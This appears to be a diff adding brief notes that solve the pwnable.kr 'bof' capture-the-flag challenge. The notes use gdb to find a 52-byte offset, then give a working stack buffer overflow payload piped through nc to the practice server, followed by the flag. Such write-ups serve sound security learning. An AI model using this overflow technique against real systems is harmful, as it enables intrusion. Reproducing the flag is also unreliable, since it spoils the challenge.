@@ -1,0 +1,13 @@
+(WITH HELP)
+view source file, input buffer is before key in function "func", can buffer overflow buffer to change key
+view addresses of key and buffer start to see what size buffer should be
+gdb bof, break gets (after getting the buffer, before comparing so it will work), run, next (to get after executing gets)
+key: key gets into function as local parameter in stack (after ebp+esp,8 bytes: key is in ebp+8), x $ebp+8 to see content
+0xffffcf80:     0xdeadbeef
+buffer start: in disassembly of func(disas func in gdb), before gets esp holds the value of eax which holds the value (address) of ebp-0x2c
+x/1s $ebp-0x2c to see value:
+0xffffcf4c:     ""
+subtract both to get needed size of buffer = 52 bytes
+use nc to send a buffer long enough with the wanted key after 52 bytes:
+command: (python -c 'print("\x66"*52+"\xbe\xba\xfe\xca")';cat) | nc pwnable.kr 9000, cat flag
+flag: "daddy, I just pwned a buFFer :)"
